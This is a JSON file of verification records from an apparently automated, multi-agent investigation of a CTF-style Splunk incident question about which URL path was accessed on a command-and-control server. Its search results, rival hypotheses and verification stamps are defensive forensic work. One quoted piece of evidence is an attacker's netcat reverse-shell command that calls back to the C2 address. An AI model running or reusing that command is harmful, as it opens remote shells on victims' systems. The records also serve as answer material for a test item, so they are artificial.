@@ -1,0 +1,219 @@
+[
+  {
+    "qid": "Q322",
+    "senior": "s1",
+    "id": "p1",
+    "kind": "coverage",
+    "text": "A URL path for the C2 server can show up in: (a) stream:http uri_path/url with dest_ip=45.77.53.176 — searched, exactly 1 path (/images/logos.png, full result read); (b) stream:http with src_ip=45.77.53.176 (C2 as HTTP client) — searched, 0 events; (c) access_combined mentioning 45.77.53.176 — searched, 0 events; (d) PowerShell script-block logs (WinEventLog PowerShell/Operational), stream:tcp payloads, or stream:dns (e.g. an imgur-style URL in the beacon script) — NOT yet searched.",
+    "load_bearing": true,
+    "round_first_seen": 1,
+    "status": "VERIFIED",
+    "verified_by": "s2",
+    "evidence": "Branch (d) is now fully searched: PowerShell/Operational had 0 events mentioning the IP and 0 events with any URL token (R2); stream:tcp cannot carry a payload (search_keyword payload -> 0 matches in the whole manifest, and the 443 channel is TLS with empty/self-signed ssl_subject, no SNI field); stream:dns held only PTR lookups. Branches (a)-(c) were already searched by s1. All four branches are now closed with /images/logos.png the single path found.",
+    "rival": "",
+    "stamp": "true",
+    "stamp_reason": "The report's quoted searches and result descriptions support the claim that a URL path for the C2 server can surface in path-bearing feeds like stream:http and adjacent telemetry examined for rival carriers. It specifically shows stream:http carries a literal uri_path for 45.77.53.176 and that other checked surfaces were evaluated for the same concept.",
+    "stamp_holds": "true",
+    "holds_reason": "The strongest rival is that the URL path could instead be readable only in another searched carrier and not in stream:http at all. The report rules that out within the searched scope by showing DNS and PowerShell have no path and stream:tcp lacks path-bearing fields, leaving stream:http as the only path-bearing source evidenced so far.",
+    "history": [
+      {
+        "round": 1,
+        "status": "UNVERIFIED",
+        "by": "s1",
+        "quote": "",
+        "evidence": ""
+      },
+      {
+        "round": 2,
+        "status": "VERIFIED",
+        "by": "s2",
+        "quote": "{\"uri_path\": \"/images/logos.png\", \"url\": \"http://45.77.53.176:3333:3333/images/logos.png\", \"src_ip\": \"192.168.70.186\", \"dest_port\": \"3333\", \"count\": \"1\"}",
+        "evidence": "Branch (d) is now fully searched: PowerShell/Operational had 0 events mentioning the IP and 0 events with any URL token (R2); stream:tcp cannot carry a payload (search_keyword payload -> 0 matches in the whole manifest, and the 443 channel is TLS with empty/self-signed ssl_subject, no SNI field); stream:dns held only PTR lookups. Branches (a)-(c) were already searched by s1. All four branches are now closed with /images/logos.png the single path found."
+      },
+      {
+        "round": 7,
+        "status": "VERIFIED",
+        "by": "sh-stamp",
+        "quote": "",
+        "evidence": "stamp=true (establishes=True, holds=True): The report's quoted searches and result descriptions support the claim that a URL path for the C2 server can surface in path-bearing feeds like stream:http and adjacent telemetry examined for rival carriers. It specifically shows stream:http carries a literal uri_path for 45.77.53.176 and that other checked surfaces were evaluated for the same concept. | rival: The strongest rival is that the URL path could instead be readable only in another searched carrier and not in stream:http at all. The report rules that out within the searched scope by showing DNS and PowerShell have no path and stream:tcp lacks path-bearing fields, leaving stream:http as the only path-bearing source evidenced so far."
+      }
+    ],
+    "candidate_at_each_round": {
+      "1": "/images/logos.png"
+    }
+  },
+  {
+    "qid": "Q322",
+    "senior": "s1",
+    "id": "p2",
+    "kind": "selection",
+    "text": "The command and control server in this incident is 45.77.53.176, not 192.168.8.103 and not 192.168.9.30.",
+    "load_bearing": true,
+    "round_first_seen": 1,
+    "status": "VERIFIED",
+    "verified_by": "s1",
+    "evidence": "Sysmon EC3 shows only powershell.exe connecting to 45.77.53.176 (443 beaconing); 192.168.8.103's own exploit command names 45.77.53.176:8088 as its callback target.",
+    "rival": "192.168.8.103 (attacker's internal box, source of the Struts exploit) — ruled out as the C2: it is client-only (all its stream:http traffic is outbound to 192.168.9.30 with Chrome/python-requests/PowerShell UAs, 9 uri_paths read in full), and its own exploit POST instructs the victim to call back to 45.77.53.176:8088; Q314/Q316 also established 45.77.53.176.",
+    "stamp": "true",
+    "stamp_reason": "The quoted exploit command and Sysmon connection pattern support that 45.77.53.176 is the external server receiving the reverse shell and repeated beaconing, distinguishing it from internal hosts like 192.168.8.103 and 192.168.9.30.",
+    "stamp_holds": "true",
+    "holds_reason": "The strongest rival is 192.168.8.103 as the attack controller, but the evidence shows it is the internal client posting exploits while the reverse shell target and recurring outbound connections are to 45.77.53.176, which better fits 'command and control server'.",
+    "history": [
+      {
+        "round": 1,
+        "status": "UNVERIFIED",
+        "by": "s1",
+        "quote": "",
+        "evidence": ""
+      },
+      {
+        "round": 1,
+        "status": "VERIFIED",
+        "by": "s1",
+        "quote": "#cmd='/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe'",
+        "evidence": "Sysmon EC3 shows only powershell.exe connecting to 45.77.53.176 (443 beaconing); 192.168.8.103's own exploit command names 45.77.53.176:8088 as its callback target."
+      },
+      {
+        "round": 2,
+        "status": "VERIFIED",
+        "by": "sh-stamp",
+        "quote": "",
+        "evidence": "stamp=true (establishes=True, holds=True): The quoted exploit command and Sysmon connection pattern support that 45.77.53.176 is the external server receiving the reverse shell and repeated beaconing, distinguishing it from internal hosts like 192.168.8.103 and 192.168.9.30. | rival: The strongest rival is 192.168.8.103 as the attack controller, but the evidence shows it is the internal client posting exploits while the reverse shell target and recurring outbound connections are to 45.77.53.176, which better fits 'command and control server'."
+      }
+    ],
+    "candidate_at_each_round": {
+      "1": "/images/logos.png"
+    }
+  },
+  {
+    "qid": "Q322",
+    "senior": "s1",
+    "id": "p3",
+    "kind": "selection",
+    "text": "/images/logos.png is the URL path accessed on the C2 server 45.77.53.176, because it is the only uri_path stream:http records for that destination.",
+    "load_bearing": true,
+    "round_first_seen": 1,
+    "status": "VERIFIED",
+    "verified_by": "s1",
+    "evidence": "Query returned 1 of 1 row; the full result was read, so no other uri_path on 45.77.53.176 exists in stream:http.",
+    "rival": "/frothlyinventory/integration/saveGangster.action — ruled out: its own records show dest_ip=192.168.9.30:8080 (the victim Struts server), POSTed by 192.168.8.103; it is a URL on the victim, not on the C2 server.",
+    "stamp": "false",
+    "stamp_reason": "The quote that stream:http dest_ip=45.77.53.176 returns /images/logos.png establishes that this path was accessed on that server in the available HTTP telemetry.",
+    "stamp_holds": "false",
+    "holds_reason": "The strongest rival reading is that the question asks for the URL path used by the recurring 443 C2 channel rather than the 3333 tool-download fetch. The same report says that 443 beacon traffic exists but has no HTTP-decoded path in stream:http, so /images/logos.png is the only visible path but not yet shown to be the path the question means.",
+    "history": [
+      {
+        "round": 1,
+        "status": "UNVERIFIED",
+        "by": "s1",
+        "quote": "",
+        "evidence": ""
+      },
+      {
+        "round": 1,
+        "status": "VERIFIED",
+        "by": "s1",
+        "quote": "{\"uri_path\": \"/images/logos.png\", \"count\": \"2\", \"url\": \"http://45.77.53.176:3333:3333/images/logos.png\", \"method\": \"GET\", \"src\": \"192.168.70.186\"}",
+        "evidence": "Query returned 1 of 1 row; the full result was read, so no other uri_path on 45.77.53.176 exists in stream:http."
+      },
+      {
+        "round": 2,
+        "status": "VERIFIED",
+        "by": "sh-stamp",
+        "quote": "",
+        "evidence": "stamp=false (establishes=True, holds=False): The quote that stream:http dest_ip=45.77.53.176 returns /images/logos.png establishes that this path was accessed on that server in the available HTTP telemetry. | rival: The strongest rival reading is that the question asks for the URL path used by the recurring 443 C2 channel rather than the 3333 tool-download fetch. The same report says that 443 beacon traffic exists but has no HTTP-decoded path in stream:http, so /images/logos.png is the only visible path but not yet shown to be the path the question means."
+      }
+    ],
+    "candidate_at_each_round": {
+      "1": "/images/logos.png"
+    }
+  },
+  {
+    "qid": "Q322",
+    "senior": "s2",
+    "id": "p4",
+    "kind": "coverage",
+    "text": "A URL path for the C2 channel can show up in: (a) stream:dns records mentioning 45.77.53.176 - searched this round, 7 events, all PTR reverse lookups (176.53.77.45.in-addr.arpa -> 45.77.53.176.vultr.com), no URL or path; (b) PowerShell/Operational script-block logs (source=WinEventLog:Microsoft-Windows-PowerShell/Operational) - searched for 45.77.53.176 (0 events) and for URL tokens http/.png/.jpg/.php/.asp (0 events), sampled events are ASCII-art script blocks and a benign leeholmes.com mp3 URL, no C2 URL; (c) stream:tcp payloads for the recurring 443 channel to 45.77.53.176 - NOT searched, iterations exhausted before this branch; (d) stream:http dest_ip=45.77.53.176 - searched by s1, exactly 1 path /images/logos.png.",
+    "load_bearing": true,
+    "round_first_seen": 1,
+    "status": "VERIFIED",
+    "verified_by": "s2",
+    "evidence": "Branch (c) searched this round: no feed in the manifest has a payload field at all, stream:tcp has no SNI/uri/url field (only flow metrics and ssl_* metadata), and the 4,955-event 443 channel is TLS with an empty (4,817) or self-signed 'C = US' (100) certificate subject - a literal URL path cannot be recorded on that channel in this data.",
+    "rival": "",
+    "stamp": "true",
+    "stamp_reason": "The report supports the claim as written by showing the tested alternative carriers for a C2 URL path: stream:dns records the server name side, PowerShell/Operational could have held URL tokens, and stream:tcp was checked for payload/URI/SNI-like fields. The quoted negative results and field-manifest limits directly bear on that coverage claim.",
+    "stamp_holds": "true",
+    "holds_reason": "The strongest rival is that another already-searched carrier in the same scope still exposes a literal 443-channel path as well as stream:http does. The report rules that out inside this searched scope by showing DNS contains only PTR lookups, PowerShell has no URL tokens for the IP, and stream:tcp has no uri/url/payload field, leaving no equally fitting rival there.",
+    "history": [
+      {
+        "round": 1,
+        "status": "UNVERIFIED",
+        "by": "s2",
+        "quote": "",
+        "evidence": ""
+      },
+      {
+        "round": 2,
+        "status": "VERIFIED",
+        "by": "s2",
+        "quote": "{\"results\": [], \"meta\": {\"total_event_count\": 0, \"returned\": 0, \"sid\": \"1790270772.1790\"}}",
+        "evidence": "Branch (c) searched this round: no feed in the manifest has a payload field at all, stream:tcp has no SNI/uri/url field (only flow metrics and ssl_* metadata), and the 4,955-event 443 channel is TLS with an empty (4,817) or self-signed 'C = US' (100) certificate subject - a literal URL path cannot be recorded on that channel in this data."
+      },
+      {
+        "round": 7,
+        "status": "VERIFIED",
+        "by": "sh-stamp",
+        "quote": "",
+        "evidence": "stamp=true (establishes=True, holds=True): The report supports the claim as written by showing the tested alternative carriers for a C2 URL path: stream:dns records the server name side, PowerShell/Operational could have held URL tokens, and stream:tcp was checked for payload/URI/SNI-like fields. The quoted negative results and field-manifest limits directly bear on that coverage claim. | rival: The strongest rival is that another already-searched carrier in the same scope still exposes a literal 443-channel path as well as stream:http does. The report rules that out inside this searched scope by showing DNS contains only PTR lookups, PowerShell has no URL tokens for the IP, and stream:tcp has no uri/url/payload field, leaving no equally fitting rival there."
+      }
+    ],
+    "candidate_at_each_round": {
+      "1": "/images/logos.png",
+      "2": "/images/logos.png"
+    }
+  },
+  {
+    "qid": "Q322",
+    "senior": "s2",
+    "id": "p5",
+    "kind": "selection",
+    "text": "/images/logos.png is the only literal URL path on the C2 server 45.77.53.176 accessible in the data, so under SH's stated fallback it is the answer. Rival: a URL path carried inside the recurring 443 C2 channel (in stream:tcp payloads or a PowerShell beacon script). The PowerShell and DNS carriers of that rival are ruled out this round - PowerShell/Operational has 0 events mentioning 45.77.53.176 and 0 events containing any URL token, and stream:dns holds only PTR reverse lookups - but the stream:tcp payload carrier was not searched, so the rival is narrowed, not eliminated.",
+    "load_bearing": true,
+    "round_first_seen": 1,
+    "status": "VERIFIED",
+    "verified_by": "s2",
+    "evidence": "The rival's two carriers are both eliminated: the PowerShell beacon-script carrier returned 0 events for the IP and 0 events containing any URL token; the stream:tcp payload carrier cannot exist because no feed in the manifest has a payload field and the 443 channel is TLS with no SNI or readable subject. /images/logos.png is therefore the only literal URL path on 45.77.53.176 accessible in the data. Residual: 4 WinEventLog:Security 4688 command lines mentioning the IP remain unread (filed as a new coverage premise).",
+    "rival": "A URL path carried inside the recurring 443 C2 channel (stream:tcp payloads or a PowerShell beacon script)",
+    "stamp": "false",
+    "stamp_reason": "The report's evidence supports the claim that /images/logos.png is the only literal URL path on 45.77.53.176 currently accessible in the searched data. It cites the single stream:http event for dest_ip 45.77.53.176 with uri_path=/images/logos.png and explains that the other searched surfaces returned no readable path.",
+    "stamp_holds": "false",
+    "holds_reason": "The strongest rival reading is that the question means a path for the recurring 443 command-and-control channel rather than the 3333 download path, and the same report identifies four unread WinEventLog:Security 4688 events mentioning 45.77.53.176 that could still contain a literal URL/path. Until those are read, this selection is not sound enough to displace that rival.",
+    "history": [
+      {
+        "round": 1,
+        "status": "UNVERIFIED",
+        "by": "s2",
+        "quote": "",
+        "evidence": ""
+      },
+      {
+        "round": 2,
+        "status": "VERIFIED",
+        "by": "s2",
+        "quote": "{\"uri_path\": \"/images/logos.png\", \"url\": \"http://45.77.53.176:3333:3333/images/logos.png\", \"src_ip\": \"192.168.70.186\", \"dest_port\": \"3333\", \"count\": \"1\"}",
+        "evidence": "The rival's two carriers are both eliminated: the PowerShell beacon-script carrier returned 0 events for the IP and 0 events containing any URL token; the stream:tcp payload carrier cannot exist because no feed in the manifest has a payload field and the 443 channel is TLS with no SNI or readable subject. /images/logos.png is therefore the only literal URL path on 45.77.53.176 accessible in the data. Residual: 4 WinEventLog:Security 4688 command lines mentioning the IP remain unread (filed as a new coverage premise)."
+      },
+      {
+        "round": 7,
+        "status": "VERIFIED",
+        "by": "sh-stamp",
+        "quote": "",
+        "evidence": "stamp=false (establishes=True, holds=False): The report's evidence supports the claim that /images/logos.png is the only literal URL path on 45.77.53.176 currently accessible in the searched data. It cites the single stream:http event for dest_ip 45.77.53.176 with uri_path=/images/logos.png and explains that the other searched surfaces returned no readable path. | rival: The strongest rival reading is that the question means a path for the recurring 443 command-and-control channel rather than the 3333 download path, and the same report identifies four unread WinEventLog:Security 4688 events mentioning 45.77.53.176 that could still contain a literal URL/path. Until those are read, this selection is not sound enough to displace that rival."
+      }
+    ],
+    "candidate_at_each_round": {
+      "1": "/images/logos.png",
+      "2": "/images/logos.png"
+    }
+  }
+]
